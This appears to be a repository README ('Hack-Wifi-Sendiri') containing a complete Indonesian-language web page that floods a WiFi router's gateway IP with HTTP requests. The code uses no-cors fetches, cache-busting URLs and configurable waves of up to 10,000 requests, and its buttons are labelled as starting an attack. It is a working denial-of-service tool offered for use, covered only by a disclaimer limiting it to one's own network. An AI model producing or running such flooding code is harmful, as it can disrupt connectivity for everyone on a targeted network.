# Hack-Wifi-Sendiri
Wifi
<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=yes">
    <title>WiFi Stress Test (Local DoS)</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }
        body {
            background: #0a0f1a;
            font-family: 'Courier New', monospace;
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
            padding: 20px;
        }
        .card {
            background: #11161f;
            border-radius: 2rem;
            border-left: 4px solid #ff3b6f;
            max-width: 600px;
            width: 100%;
            padding: 1.8rem;
            box-shadow: 0 20px 30px rgba(0,0,0,0.5);
        }
        h1 {
            font-size: 1.6rem;
            color: #ff5e8e;
            margin-bottom: 0.5rem;
        }
        p {
            color: #9aaec0;
            font-size: 0.8rem;
            margin-bottom: 1.5rem;
        }
        .input-group {
            margin: 1rem 0;
        }
        label {
            display: block;
            color: #ffb7c5;
            font-size: 0.8rem;
            margin-bottom: 6px;
        }
        input, button {
            width: 100%;
            padding: 10px 14px;
            background: #1e2a2f;
            border: 1px solid #2a3a44;
            border-radius: 30px;
            color: white;
            font-family: monospace;
        }
        button {
            background: #ff3b6f;
            border: none;
            font-weight: bold;
            cursor: pointer;
            transition: 0.1s;
            margin-top: 10px;
        }
        button:active {
            transform: scale(0.98);
        }
        .status {
            background: #07111a;
            border-radius: 20px;
            padding: 10px;
            margin-top: 20px;
            font-size: 0.75rem;
            color: #76b3e0;
            word-break: break-all;
        }
        .warning {
            font-size: 0.65rem;
            color: #ffaa88;
            margin-top: 1rem;
            background: #2a1a22;
            padding: 8px;
            border-radius: 16px;
            text-align: center;
        }
    </style>
</head>
<body>
<div class="card">
    <h1>🔥 WiFi Stress Tool (Local DoS)</h1>
    <p>Banjiri router dengan permintaan HTTP – <strong>hanya untuk pengujian jaringan sendiri</strong>.</p>

    <div class="input-group">
        <label>🌐 IP GATEWAY (target router)</label>
        <input type="text" id="targetIP" placeholder="192.168.1.1" value="192.168.1.1">
    </div>
    <div class="input-group">
        <label>📦 Jumlah request per gelombang (paket)</label>
        <input type="number" id="packetCount" value="500" min="10" max="10000">
    </div>
    <div class="input-group">
        <label>⏱️ Interval antar request (ms) – rendah = lebih agresif</label>
        <input type="number" id="intervalMs" value="1" min="0" max="100">
    </div>

    <button id="startBtn">💣 MULAI SERANGAN (BANJIR) 💣</button>
    <button id="stopBtn" style="background:#4a2a3a; margin-top: 8px;">⏹️ HENTIKAN</button>

    <div class="status" id="status">Status: Siap</div>
    <div class="warning">
        ⚠️ EFEK NYATA: Router dapat menjadi tidak responsif, koneksi WiFi semua perangkat terganggu.<br>
        Gunakan hanya pada jaringan pribadi milik sendiri. Saya tidak bertanggung jawab atas penyalahgunaan.
    </div>
</div>

<script>
    let attackActive = false;
    let currentInterval = null;

    const startBtn = document.getElementById('startBtn');
    const stopBtn = document.getElementById('stopBtn');
    const statusDiv = document.getElementById('status');
    const targetIPInput = document.getElementById('targetIP');
    const packetCountInput = document.getElementById('packetCount');
    const intervalMsInput = document.getElementById('intervalMs');

    // Fungsi mengirim request (fetch) ke target gateway
    async function sendRequest(url, idx) {
        try {
            // Fetch dengan mode no-cors agar tidak terhalang CORS (tetap mengirim request ke router)
            await fetch(url, { mode: 'no-cors', cache: 'no-store' });
        } catch (e) {
            // Gagal tetap dianggap request terkirim (network error tetap membebani router)
        }
    }

    async function startAttack() {
        if (attackActive) return;
        let target = targetIPInput.value.trim();
        if (!target) {
            statusDiv.innerHTML = "❌ Masukkan IP gateway (contoh: 192.168.1.1)";
            return;
        }
        // pastikan format IP tidak http://
        if (!target.startsWith('http')) target = 'http://' + target;
        // tambahkan path untuk memastikan request unik dan tidak cache
        let packetCount = parseInt(packetCountInput.value);
        if (isNaN(packetCount)) packetCount = 500;
        let intervalMs = parseInt(intervalMsInput.value);
        if (isNaN(intervalMs)) intervalMs = 1;

        attackActive = true;
        statusDiv.innerHTML = `🚀 SERANGAN BERJALAN → ${packetCount} request setiap ${intervalMs}ms ke ${target}. Router mungkin overload.`;
        
        // fungsi loop attack
        let requestIndex = 0;
        currentInterval = setInterval(() => {
            if (!attackActive) {
                clearInterval(currentInterval);
                currentInterval = null;
                return;
            }
            for (let i = 0; i < packetCount; i++) {
                const uniqueUrl = `${target}/?nocache=${Date.now()}_${requestIndex}_${i}`;
                sendRequest(uniqueUrl, i);
            }
            requestIndex++;
            statusDiv.innerHTML = `💥 Flood aktif | ${packetCount} req dikirim ke ${target} (wave ${requestIndex})`;
        }, intervalMs);
    }

    function stopAttack() {
        attackActive = false;
        if (currentInterval) {
            clearInterval(currentInterval);
            currentInterval = null;
        }
        statusDiv.innerHTML = "⏸️ Serangan dihentikan. Router akan pulih dalam beberapa detik.";
    }

    startBtn.addEventListener('click', startAttack);
    stopBtn.addEventListener('click', stopAttack);
</script>
</body>
</html>
